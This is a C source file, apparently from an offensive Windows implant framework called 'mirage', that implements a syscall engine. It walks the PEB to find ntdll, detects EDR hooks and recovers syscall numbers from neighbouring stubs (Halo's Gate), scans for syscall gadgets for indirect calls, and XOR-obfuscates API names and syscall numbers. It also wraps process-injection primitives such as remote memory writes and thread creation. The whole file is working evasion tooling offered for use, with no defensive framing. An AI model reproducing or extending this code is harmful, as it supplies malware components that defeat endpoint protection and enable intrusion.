/*
 * engine.c — Syscall engine with WinAPI fallback
 *
 * Tries PEB walk for indirect syscalls. If it fails, falls back
 * to standard kernel32.dll / ntdll.dll imports.
 */
#include "engine.h"
#include "hash.h"
#include "peb.h"
#include "export_resolve.h"
#include "config.h"
#include "mirage_asm.h"
#include "enc_strings.h"
#include <stddef.h>
#include <windows.h>

/* ── State ────────────────────────────────────────────────────── */
static int g_use_fallback = 1;

/* ── PEB-based resolution ─────────────────────────────────────── */

static inline uint32_t r32le(const uint8_t* p) {
    return (uint32_t)p[0]|((uint32_t)p[1]<<8)|
           ((uint32_t)p[2]<<16)|((uint32_t)p[3]<<24);
}

static int hooked(const uint8_t* s) {
    if (s[0]==0xE9) return 1;
    if (s[0]==0xFF && s[1]==0x25) return 1;
    if (s[0]==0xCC) return 1;
    return 0;
}

static uint32_t xssn(const uint8_t* s) {
    if (s[0]==0x4C && s[1]==0x8B && s[2]==0xD1 && s[3]==0xB8)
        return r32le(s+4);
    for (uint32_t i=0; i<12; i++)
        if (s[i]==0xB8 && (i+4)<=0x20) {
            uint32_t c=r32le(s+i+1);
            if (c < 0x500) return c;
        }
    return 0;
}

typedef struct { uintptr_t s; uintptr_t e; } TB;

static int tbounds(void* base, TB* o) {
    uint8_t* bp=(uint8_t*)base;
    PIMAGE_DOS_HEADER dos=(PIMAGE_DOS_HEADER)bp;
    if (dos->e_magic!=IMAGE_DOS_SIGNATURE) return 0;
    uint32_t off=(uint32_t)dos->e_lfanew;
    PIMAGE_NT_HEADERS64 nt=(PIMAGE_NT_HEADERS64)(bp+off);
    if (nt->Signature!=IMAGE_NT_SIGNATURE) return 0;
    uint32_t so=off+sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)
               +nt->FileHeader.SizeOfOptionalHeader;
    PIMAGE_SECTION_HEADER sc=(PIMAGE_SECTION_HEADER)(bp+so);
    for (uint16_t i=0; i<nt->FileHeader.NumberOfSections; i++) {
        if (sc[i].Name[0]=='.' && sc[i].Name[1]=='t' &&
            sc[i].Name[2]=='e' && sc[i].Name[3]=='x' && sc[i].Name[4]=='t') {
            o->s=(uintptr_t)bp+sc[i].VirtualAddress;
            o->e=o->s+sc[i].Misc.VirtualSize;
            return 1;
        }
    }
    return 0;
}

static uint32_t rsn(void* ntdll, uint32_t hash) {
    void* fp=mirage_get_function_by_hash(ntdll, hash);
    if (!fp) return 0;
    const uint8_t* st=(const uint8_t*)fp;
    if (!hooked(st)) return xssn(st);
    TB b;
    if (!tbounds(ntdll, &b)) return 0;
    uintptr_t sa=(uintptr_t)st;
    static const uintptr_t st2[]={0x20,0x28,0x30};
    for (uintptr_t d=1; d<=8; d++) {
        for (uint32_t s=0; s<3; s++) {
            uintptr_t o=d*st2[s];
            uintptr_t fw=sa+o;
            if (fw+0x20<=b.e) {
                const uint8_t* fs=(const uint8_t*)fw;
                if (!hooked(fs)) {
                    uint32_t ns=xssn(fs);
                    if (ns) return ns-(uint32_t)d;
                }
            }
            if (o<=(sa-b.s)) {
                uintptr_t bw=sa-o;
                if (bw>=b.s && bw+0x20<=b.e) {
                    const uint8_t* bs=(const uint8_t*)bw;
                    if (!hooked(bs)) {
                        uint32_t ns=xssn(bs);
                        if (ns) return ns+(uint32_t)d;
                    }
                }
            }
        }
    }
    return 0;
}

static int r1(void* base, uint32_t h, uint32_t* o) {
    uint32_t s=rsn(base, h);
    if (s) { *o=s; return 1; }
    return 0;
}

/* ── Halo's Gate fallback ──────────────────────────────────────── */

static uint32_t resolve_ssn_halo(void* ntdll_base, uint32_t target_hash) {
    void* func = mirage_get_function_by_hash(ntdll_base, target_hash);
    if (!func) return 0;

    uint8_t* bytes = (uint8_t*)func;
    if (bytes[0] == 0xE9 || bytes[0] == 0xFF) return 0;

    uint32_t ssn = xssn(bytes);
    if (ssn && ssn < 0x500) return ssn;

    TB b;
    if (!tbounds(ntdll_base, &b)) return 0;

    for (int dir = -1; dir <= 1; dir += 2) {
        for (uintptr_t offset = 0x20; offset < 0x200; offset += 0x20) {
            uintptr_t addr = (uintptr_t)((intptr_t)func + (intptr_t)dir * (intptr_t)offset);
            if (addr < b.s || addr + 8 >= b.e) continue;
            uint8_t* probe = (uint8_t*)addr;
            if (probe[0]==0x4C && probe[1]==0x8B && probe[2]==0xD1 && probe[3]==0xB8) {
                uint32_t candidate = r32le(probe+4);
                if (candidate > 0x1000 && candidate < 0x2000) {
                    if (ssn) {
                        int64_t diff = (int64_t)candidate - (int64_t)ssn;
                        if (diff > 0 && diff < 50) return candidate;
                    } else {
                        return candidate;
                    }
                }
            }
        }
    }
    return 0;
}

static void obf(void) {
    uint32_t* p[] = {
        &ssn_NtAllocateVirtualMemory, &ssn_NtProtectVirtualMemory,
        &ssn_NtFreeVirtualMemory, &ssn_NtWriteVirtualMemory,
        &ssn_NtClose, &ssn_NtOpenFile, &ssn_NtReadVirtualMemory,
        &ssn_NtCreateSection, &ssn_NtMapViewOfSection,
        &ssn_NtQueryInformationProcess, &ssn_NtCreateFile,
        &ssn_NtWriteFile, &ssn_NtQuerySystemInformation,
        &ssn_NtDelayExecution, &ssn_NtCreateEvent,
        &ssn_NtWaitForSingleObject, &ssn_NtOpenKey,
        &ssn_NtQueryValueKey, &ssn_NtSetInformationProcess,
        &ssn_NtSetInformationFile, &ssn_NtGetContextThread,
        &ssn_NtSetContextThread, &ssn_NtOpenSection,
        &ssn_NtUnmapViewOfSection, &ssn_NtCreateThreadEx,
        &ssn_NtOpenProcess, &ssn_NtResumeThread,
        &ssn_NtSuspendThread, &ssn_NtDeleteFile,
        &ssn_NtFlushInstructionCache, &ssn_NtUserGetSystemMetrics,
    };
    for (uint32_t i=0; i<sizeof(p)/sizeof(p[0]); i++)
        *p[i] ^= ssn_xor_key;
}


int mirage_syscall_resolve(void) {
    /* Generate dynamic SSN XOR key per-run */
    /* Resolve GetTickCount via PEB-walk */
    typedef DWORD (WINAPI *pGetTickCount)(void);
    static pGetTickCount pGT = NULL;
    if (!pGT) {
        char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
        void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
        if (k32) {
            char fn[32];
            enc_decrypt(enc_GetTickCount, ENC_GETTICKCOUNT_LEN, fn);
            pGT = (pGetTickCount)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
        }
    }
    ssn_xor_key = MIRAGE_SEED ^ (uint32_t)(pGT ? pGT() : 0);

    char dll_buf[32]; enc_decrypt(enc_ntdll, ENC_NTDLL_LEN, dll_buf);
    uint32_t h = mirage_encrypted_hash_module(dll_buf);
    void* ntdll = mirage_get_module_by_hash(h);
    if (!ntdll) { g_use_fallback = 1; return 0; }
    mirage_init_native_resolver(ntdll);

    uint32_t hash;
    char fn_buf[32];

    enc_decrypt(enc_NtAllocateVirtualMemory, ENC_NTALLOCATEVIRTUALMEMORY_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtAllocateVirtualMemory))
        ssn_NtAllocateVirtualMemory = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtProtectVirtualMemory, ENC_NTPROTECTVIRTUALMEMORY_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtProtectVirtualMemory))
        ssn_NtProtectVirtualMemory = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtFreeVirtualMemory, ENC_NTFREEVIRTUALMEMORY_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtFreeVirtualMemory))
        ssn_NtFreeVirtualMemory = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtWriteVirtualMemory, ENC_NTWRITEVIRTUALMEMORY_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtWriteVirtualMemory))
        ssn_NtWriteVirtualMemory = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtClose, ENC_NTCLOSE_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtClose))
        ssn_NtClose = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtOpenFile, ENC_NTOPENFILE_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtOpenFile))
        ssn_NtOpenFile = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtReadVirtualMemory, ENC_NTREADVIRTUALMEMORY_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtReadVirtualMemory))
        ssn_NtReadVirtualMemory = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtCreateSection, ENC_NTCREATESECTION_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtCreateSection))
        ssn_NtCreateSection = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtMapViewOfSection, ENC_NTMAPVIEWOFSECTION_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtMapViewOfSection))
        ssn_NtMapViewOfSection = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtQueryInformationProcess, ENC_NTQUERYINFORMATIONPROCESS_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtQueryInformationProcess))
        ssn_NtQueryInformationProcess = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtCreateFile, ENC_NTCREATEFILE_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtCreateFile))
        ssn_NtCreateFile = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtWriteFile, ENC_NTWRITEFILE_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtWriteFile))
        ssn_NtWriteFile = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtQuerySystemInformation, ENC_NTQUERYSYSTEMINFORMATION_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtQuerySystemInformation))
        ssn_NtQuerySystemInformation = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtDelayExecution, ENC_NTDELAYEXECUTION_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtDelayExecution))
        ssn_NtDelayExecution = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtOpenKey, ENC_NTOPENKEY_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtOpenKey))
        ssn_NtOpenKey = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtQueryValueKey, ENC_NTQUERYVALUEKEY_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtQueryValueKey))
        ssn_NtQueryValueKey = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtSetInformationProcess, ENC_NTSETINFORMATIONPROCESS_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtSetInformationProcess))
        ssn_NtSetInformationProcess = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtCreateThreadEx, ENC_NTCREATETHREADEX_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtCreateThreadEx))
        ssn_NtCreateThreadEx = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtOpenProcess, ENC_NTOPENPROCESS_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtOpenProcess))
        ssn_NtOpenProcess = resolve_ssn_halo(ntdll, hash);

    enc_decrypt(enc_NtFlushInstructionCache, ENC_NTFLUSHINSTRUCTIONCACHE_LEN, fn_buf);
    hash = mirage_encrypted_hash_func(fn_buf);
    if (!r1(ntdll, hash, &ssn_NtFlushInstructionCache))
        ssn_NtFlushInstructionCache = resolve_ssn_halo(ntdll, hash);

    obf();
    g_use_fallback = 0;
    return 1;
}

int mirage_init_gadget_pool(void) {
    void* ntdll = NULL;
    char dll[32]; enc_decrypt(enc_ntdll, ENC_NTDLL_LEN, dll);
    uint32_t h = mirage_encrypted_hash_module(dll);
    ntdll = mirage_get_module_by_hash(h);
    if (!ntdll) return 0;
    TB b;
    if (!tbounds(ntdll, &b)) return 0;
    const uint8_t* d=(const uint8_t*)b.s;
    uintptr_t len = b.e - b.s;
    uint32_t c = 0;
    for (uintptr_t i=0; i+2<len && c<64; i++)
        if (d[i]==0x0F && d[i+1]==0x05 && d[i+2]==0xC3)
            gadget_pool[c++] = b.s + i;
    if (c==0) return 0;
    for (uint32_t i=c; i<64; i++)
        gadget_pool[i] = gadget_pool[i % c];
    return 1;
}

/* ═══════ Global SSN XOR key (set at runtime) ═══════════════════ */
uint32_t ssn_xor_key = 0xA3B5C7D9;

/* ═══════ XOR-obfuscated export names ══════════════════════════ */

static const unsigned char _NtAllocateVirtualMemory_obf[23] = { 0x5c, 0x81, 0xdb, 0x4a, 0xfb, 0xed, 0x70, 0x64, 0xa3, 0xf1, 0x3a, 0xe5, 0xf3, 0x1f, 0x44, 0xce, 0x7e, 0xb8, 0xff, 0x4b, 0xf8, 0xf0, 0x6a };
static const unsigned char _NtProtectVirtualMemory_obf[22] = { 0x5c, 0x81, 0xca, 0x54, 0xf8, 0xf6, 0x76, 0x66, 0xa3, 0xc2, 0x05, 0xfe, 0xf5, 0x1e, 0x50, 0xc3, 0x5f, 0x90, 0xf7, 0x49, 0xe5, 0xfb };
static const unsigned char _NtFreeVirtualMemory_obf[19] = { 0x5c, 0x81, 0xdc, 0x54, 0xf2, 0xe7, 0x45, 0x6c, 0xa5, 0xe0, 0x19, 0xed, 0xed, 0x26, 0x54, 0xc2, 0x7d, 0x87, 0xe3 };
static const unsigned char _NtWriteVirtualMemory_obf[20] = { 0x5c, 0x81, 0xcd, 0x54, 0xfe, 0xf6, 0x76, 0x53, 0xbe, 0xe6, 0x18, 0xf9, 0xe0, 0x07, 0x7c, 0xca, 0x7f, 0x9a, 0xe8, 0x5f };
static const unsigned char _NtReadVirtualMemory_obf[19] = { 0x5c, 0x81, 0xc8, 0x43, 0xf6, 0xe6, 0x45, 0x6c, 0xa5, 0xe0, 0x19, 0xed, 0xed, 0x26, 0x54, 0xc2, 0x7d, 0x87, 0xe3 };
static const unsigned char _NtClose_obf[7] = { 0x5c, 0x81, 0xd9, 0x4a, 0xf8, 0xf1, 0x76 };
static const unsigned char _NtQuerySystemInformation_obf[24] = { 0x5c, 0x81, 0xcb, 0x53, 0xf2, 0xf0, 0x6a, 0x56, 0xae, 0xe7, 0x18, 0xe9, 0xec, 0x22, 0x5f, 0xc9, 0x7d, 0x87, 0xf7, 0x47, 0xe3, 0xeb, 0x7c, 0x6b };
static const unsigned char _NtQueryInformationProcess_obf[25] = { 0x5c, 0x81, 0xcb, 0x53, 0xf2, 0xf0, 0x6a, 0x4c, 0xb9, 0xf2, 0x03, 0xfe, 0xec, 0x0a, 0x45, 0xc6, 0x7d, 0x9b, 0xca, 0x54, 0xf8, 0xe1, 0x76, 0x76, 0xa4 };
static const unsigned char _NtDelayExecution_obf[16] = { 0x5c, 0x81, 0xde, 0x43, 0xfb, 0xe3, 0x6a, 0x40, 0xaf, 0xf1, 0x0f, 0xf9, 0xf5, 0x02, 0x5e, 0xc1 };
static const unsigned char _NtOpenFile_obf[10] = { 0x5c, 0x81, 0xd5, 0x56, 0xf2, 0xec, 0x55, 0x6c, 0xbb, 0xf1 };
static const unsigned char _NtWriteFile_obf[11] = { 0x5c, 0x81, 0xcd, 0x54, 0xfe, 0xf6, 0x76, 0x43, 0xbe, 0xf8, 0x09 };
static const unsigned char _NtSetInformationProcess_obf[23] = { 0x5c, 0x81, 0xc9, 0x43, 0xe3, 0xcb, 0x7d, 0x63, 0xb8, 0xe6, 0x01, 0xed, 0xf5, 0x02, 0x5e, 0xc1, 0x42, 0x87, 0xf5, 0x45, 0xf2, 0xf1, 0x60 };
static const unsigned char _NtOpenKey_obf[9] = { 0x5c, 0x81, 0xd5, 0x56, 0xf2, 0xec, 0x58, 0x60, 0xae };
static const unsigned char _NtQueryValueKey_obf[15] = { 0x5c, 0x81, 0xcb, 0x53, 0xf2, 0xf0, 0x6a, 0x53, 0xb6, 0xf8, 0x19, 0xe9, 0xca, 0x0e, 0x48 };
static const unsigned char _NtOpenProcess_obf[13] = { 0x5c, 0x81, 0xd5, 0x56, 0xf2, 0xec, 0x43, 0x77, 0xb8, 0xf7, 0x09, 0xff, 0xf2 };
static const unsigned char _NtCreateThreadEx_obf[16] = { 0x5c, 0x81, 0xd9, 0x54, 0xf2, 0xe3, 0x67, 0x60, 0x83, 0xfc, 0x1e, 0xe9, 0xe0, 0x0f, 0x74, 0xd7 };
static const unsigned char _NtFlushInstructionCache_obf[23] = { 0x5c, 0x81, 0xdc, 0x4a, 0xe2, 0xf1, 0x7b, 0x4c, 0xb9, 0xe7, 0x18, 0xfe, 0xf4, 0x08, 0x45, 0xc6, 0x7d, 0x9b, 0xd9, 0x47, 0xf4, 0xea, 0x76 };
static const unsigned char _NtCreateEvent_obf[13] = { 0x5c, 0x81, 0xd9, 0x54, 0xf2, 0xe3, 0x67, 0x60, 0x92, 0xe2, 0x09, 0xe2, 0xf5 };
static const unsigned char _NtDeleteFile_obf[12] = { 0x5c, 0x81, 0xde, 0x43, 0xfb, 0xe7, 0x67, 0x60, 0x91, 0xfd, 0x00, 0xe9 };
static const unsigned char _NtSetInformationFile_obf[20] = { 0x5c, 0x81, 0xc9, 0x43, 0xe3, 0xcb, 0x7d, 0x63, 0xb8, 0xe6, 0x01, 0xed, 0xf5, 0x02, 0x5e, 0xc1, 0x54, 0x9c, 0xf6, 0x43 };
static const unsigned char _NtCreateFile_obf[12] = { 0x5c, 0x81, 0xd9, 0x54, 0xf2, 0xe3, 0x67, 0x60, 0x91, 0xfd, 0x00, 0xe9 };
static const unsigned char _NtEnumerateKey_obf[14] = { 0x5c, 0x81, 0xdf, 0x48, 0xe2, 0xef, 0x76, 0x77, 0xb6, 0xe0, 0x09, 0xc7, 0xe4, 0x12 };
static const unsigned char _ntdll_dll_obf[9] = { 0x7c, 0x81, 0xfe, 0x4a, 0xfb, 0xac, 0x77, 0x69, 0xbb };
static void deobf_str(const unsigned char *obf, size_t len, char *out) {
    for (size_t i = 0; i < len; i++)
        out[i] = (char)(obf[i] ^ MIRAGE_STRING_KEY_ENC[i % 16]);
    out[len] = '\0';
}

#define RESOLVE_EXPORT_OBF(arr) resolve_export_obf(arr, sizeof(arr))

typedef NTSTATUS (WINAPI *pNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG, SIZE_T*, ULONG, ULONG);
typedef NTSTATUS (WINAPI *pNtProtectVirtualMemory)(HANDLE, PVOID*, SIZE_T*, ULONG, ULONG*);
typedef NTSTATUS (WINAPI *pNtFreeVirtualMemory)(HANDLE, PVOID*, SIZE_T*, ULONG);
typedef NTSTATUS (WINAPI *pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, SIZE_T*);
typedef NTSTATUS (WINAPI *pNtReadVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, SIZE_T*);
typedef NTSTATUS (WINAPI *pNtClose)(HANDLE);
typedef NTSTATUS (WINAPI *pNtQuerySystemInformation)(ULONG, PVOID, ULONG, ULONG*);
typedef NTSTATUS (WINAPI *pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, ULONG*);
typedef NTSTATUS (WINAPI *pNtDelayExecution)(BOOLEAN, LARGE_INTEGER*);
typedef NTSTATUS (WINAPI *pNtOpenFile)(HANDLE*, ULONG, PVOID, PVOID, ULONG, ULONG);
typedef NTSTATUS (WINAPI *pNtWriteFile)(HANDLE, HANDLE, PVOID, PVOID, PVOID, PVOID, ULONG, PVOID, PVOID);
typedef NTSTATUS (WINAPI *pNtSetInformationProcess)(HANDLE, ULONG, PVOID, ULONG);
typedef NTSTATUS (WINAPI *pNtOpenKey)(HANDLE*, ULONG, PVOID);
typedef NTSTATUS (WINAPI *pNtQueryValueKey)(HANDLE, PVOID, ULONG, PVOID, ULONG, ULONG*);
typedef NTSTATUS (WINAPI *pNtOpenProcess)(HANDLE*, ULONG, PVOID, PVOID);
typedef NTSTATUS (WINAPI *pNtCreateThreadEx)(HANDLE*, ULONG, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS (WINAPI *pNtFlushInstructionCache)(HANDLE, PVOID, SIZE_T);
typedef NTSTATUS (WINAPI *pNtCreateEvent)(HANDLE*, ULONG, PVOID, ULONG, ULONG);
typedef NTSTATUS (WINAPI *pNtDeleteFile)(PVOID);
typedef NTSTATUS (WINAPI *pNtSetInformationFile)(HANDLE, PVOID, PVOID, ULONG, ULONG);
typedef NTSTATUS (WINAPI *pNtCreateFile)(HANDLE*, ULONG, PVOID, PVOID, PVOID, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);

static void* ntdll_via_peb(void) {
    char dll[32]; enc_decrypt(enc_ntdll, ENC_NTDLL_LEN, dll); return mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
}

static void* resolve_export_obf(const unsigned char *obf, size_t len) {
    void *ntdll = ntdll_via_peb();
    if (!ntdll) return NULL;
    char name[128];
    deobf_str(obf, (len < sizeof(name)) ? len : (sizeof(name) - 1), name);
    return mirage_get_function_by_hash(ntdll, mirage_encrypted_hash_func(name));
}

NTSTATUS mirage_NtAllocateVirtualMemory(HANDLE a, PVOID* b, ULONG c, SIZE_T* d, ULONG e, ULONG f) {
    if (!g_use_fallback) {
        return (NTSTATUS)NtAllocateVirtualMemory_stub((uint64_t)a,(uint64_t)b,c,(uint64_t)d,e,f);
    }
    static pNtAllocateVirtualMemory fn = NULL;
    if (!fn) fn = (pNtAllocateVirtualMemory)resolve_export_obf(_NtAllocateVirtualMemory_obf, sizeof(_NtAllocateVirtualMemory_obf));
    return fn ? fn(a,b,c,d,e,f) : -1;
}

NTSTATUS mirage_NtProtectVirtualMemory(HANDLE a, PVOID* b, SIZE_T* c, ULONG d, ULONG* e) {
    if (!g_use_fallback) {
        return (NTSTATUS)NtProtectVirtualMemory_stub((uint64_t)a,(uint64_t)b,(uint64_t)c,d,(uint64_t)e);
    }
    static pNtProtectVirtualMemory fn = NULL;
    if (!fn) fn = (pNtProtectVirtualMemory)resolve_export_obf(_NtProtectVirtualMemory_obf, sizeof(_NtProtectVirtualMemory_obf));
    return fn ? fn(a,b,c,d,e) : -1;
}

NTSTATUS mirage_NtFreeVirtualMemory(HANDLE a, PVOID* b, SIZE_T* c, ULONG d) {
    if (!g_use_fallback) {
        return (NTSTATUS)NtFreeVirtualMemory_stub((uint64_t)a,(uint64_t)b,(uint64_t)c,d);
    }
    static pNtFreeVirtualMemory fn = NULL;
    if (!fn) fn = (pNtFreeVirtualMemory)resolve_export_obf(_NtFreeVirtualMemory_obf, sizeof(_NtFreeVirtualMemory_obf));
    return fn ? fn(a,b,c,d) : -1;
}

NTSTATUS mirage_NtWriteVirtualMemory(HANDLE a, PVOID b, PVOID c, SIZE_T d, SIZE_T* e) {
    if (!g_use_fallback) {
        return (NTSTATUS)NtWriteVirtualMemory_stub((uint64_t)a,(uint64_t)b,(uint64_t)c,d,(uint64_t)e);
    }
    static pNtWriteVirtualMemory fn = NULL;
    if (!fn) fn = (pNtWriteVirtualMemory)resolve_export_obf(_NtWriteVirtualMemory_obf, sizeof(_NtWriteVirtualMemory_obf));
    return fn ? fn(a,b,c,d,e) : -1;
}

NTSTATUS mirage_NtReadVirtualMemory(HANDLE a, PVOID b, PVOID c, SIZE_T d, SIZE_T* e) {
    if (!g_use_fallback) {
        return (NTSTATUS)NtReadVirtualMemory_stub((uint64_t)a,(uint64_t)b,(uint64_t)c,d,(uint64_t)e);
    }
    static pNtReadVirtualMemory fn = NULL;
    if (!fn) fn = (pNtReadVirtualMemory)resolve_export_obf(_NtReadVirtualMemory_obf, sizeof(_NtReadVirtualMemory_obf));
    return fn ? fn(a,b,c,d,e) : -1;
}

NTSTATUS mirage_NtClose(HANDLE a) {
    if (!g_use_fallback) {
        return (NTSTATUS)NtClose_stub((uint64_t)a);
    }
    static pNtClose fn = NULL;
    if (!fn) fn = (pNtClose)resolve_export_obf(_NtClose_obf, sizeof(_NtClose_obf));
    return fn ? fn(a) : -1;
}

NTSTATUS mirage_NtQuerySystemInformation(ULONG a, PVOID b, ULONG c, ULONG* d) {
    if (!g_use_fallback) {
        return (NTSTATUS)NtQuerySystemInformation_stub(a,(uint64_t)b,c,(uint64_t)d);
    }
    static pNtQuerySystemInformation fn = NULL;
    if (!fn) fn = (pNtQuerySystemInformation)resolve_export_obf(_NtQuerySystemInformation_obf, sizeof(_NtQuerySystemInformation_obf));
    return fn ? fn(a,b,c,d) : -1;
}

NTSTATUS mirage_NtQueryInformationProcess(HANDLE a, ULONG b, PVOID c, ULONG d, ULONG* e) {
    if (!g_use_fallback) {
        return (NTSTATUS)NtQueryInformationProcess_stub((uint64_t)a,b,(uint64_t)c,d,(uint64_t)e);
    }
    static pNtQueryInformationProcess fn = NULL;
    if (!fn) fn = (pNtQueryInformationProcess)resolve_export_obf(_NtQueryInformationProcess_obf, sizeof(_NtQueryInformationProcess_obf));
    return fn ? fn(a,b,c,d,e) : -1;
}

NTSTATUS mirage_NtDelayExecution(BOOLEAN a, LARGE_INTEGER* b) {
    if (!g_use_fallback) {
        return (NTSTATUS)NtDelayExecution_stub(a,(uint64_t)b);
    }
    static pNtDelayExecution fn = NULL;
    if (!fn) fn = (pNtDelayExecution)resolve_export_obf(_NtDelayExecution_obf, sizeof(_NtDelayExecution_obf));
    return fn ? fn(a,b) : -1;
}

NTSTATUS mirage_NtCreateFile(HANDLE* a, ULONG b, PVOID c, PVOID d, PVOID e, ULONG f, ULONG g, ULONG h, ULONG i, PVOID j, ULONG k) {
    if (!g_use_fallback) {
        return (NTSTATUS)NtCreateFile_stub((uint64_t)a,b,(uint64_t)c,(uint64_t)d,(uint64_t)e,f,g,h,i,(uint64_t)j,k);
    }
    static pNtCreateFile fn = NULL;
    if (!fn) fn = (pNtCreateFile)resolve_export_obf(_NtCreateFile_obf, sizeof(_NtCreateFile_obf));
    return fn ? fn(a,b,c,d,e,f,g,h,i,j,k) : -1;
}

NTSTATUS mirage_NtOpenFile(HANDLE* a, ULONG b, PVOID c, PVOID d, ULONG e, ULONG f) {
    if (!g_use_fallback) {
        return (NTSTATUS)NtOpenFile_stub((uint64_t)a,b,(uint64_t)c,(uint64_t)d,e,f);
    }
    static pNtOpenFile fn = NULL;
    if (!fn) fn = (pNtOpenFile)resolve_export_obf(_NtOpenFile_obf, sizeof(_NtOpenFile_obf));
    return fn ? fn(a,b,c,d,e,f) : -1;
}

NTSTATUS mirage_NtWriteFile(HANDLE a, HANDLE b, PVOID c, PVOID d, PVOID e, PVOID f, ULONG g, PVOID h, PVOID i) {
    if (!g_use_fallback) {
        return (NTSTATUS)NtWriteFile_stub((uint64_t)a,(uint64_t)b,(uint64_t)c,(uint64_t)d,(uint64_t)e,(uint64_t)f,g,(uint64_t)h,(uint64_t)i);
    }
    static pNtWriteFile fn = NULL;
    if (!fn) fn = (pNtWriteFile)resolve_export_obf(_NtWriteFile_obf, sizeof(_NtWriteFile_obf));
    return fn ? fn(a,b,c,d,e,f,g,h,i) : -1;
}

NTSTATUS mirage_NtSetInformationProcess(HANDLE a, ULONG b, PVOID c, ULONG d) {
    if (!g_use_fallback) {
        return (NTSTATUS)NtSetInformationProcess_stub((uint64_t)a,b,(uint64_t)c,d);
    }
    static pNtSetInformationProcess fn = NULL;
    if (!fn) fn = (pNtSetInformationProcess)resolve_export_obf(_NtSetInformationProcess_obf, sizeof(_NtSetInformationProcess_obf));
    return fn ? fn(a,b,c,d) : -1;
}

NTSTATUS mirage_NtOpenKey(HANDLE* a, ULONG b, PVOID c) {
    if (!g_use_fallback) {
        return (NTSTATUS)NtOpenKey_stub((uint64_t)a,b,(uint64_t)c);
    }
    static pNtOpenKey fn = NULL;
    if (!fn) fn = (pNtOpenKey)resolve_export_obf(_NtOpenKey_obf, sizeof(_NtOpenKey_obf));
    return fn ? fn(a,b,c) : -1;
}

NTSTATUS mirage_NtQueryValueKey(HANDLE a, PVOID b, ULONG c, PVOID d, ULONG e, ULONG* f) {
    if (!g_use_fallback) {
        return (NTSTATUS)NtQueryValueKey_stub((uint64_t)a,(uint64_t)b,c,(uint64_t)d,e,(uint64_t)f);
    }
    static pNtQueryValueKey fn = NULL;
    if (!fn) fn = (pNtQueryValueKey)resolve_export_obf(_NtQueryValueKey_obf, sizeof(_NtQueryValueKey_obf));
    return fn ? fn(a,b,c,d,e,f) : -1;
}

NTSTATUS mirage_NtOpenProcess(HANDLE* a, ULONG b, PVOID c, PVOID d) {
    if (!g_use_fallback) {
        return (NTSTATUS)NtOpenProcess_stub((uint64_t)a,b,(uint64_t)c,(uint64_t)d);
    }
    static pNtOpenProcess fn = NULL;
    if (!fn) fn = (pNtOpenProcess)resolve_export_obf(_NtOpenProcess_obf, sizeof(_NtOpenProcess_obf));
    return fn ? fn(a,b,c,d) : -1;
}

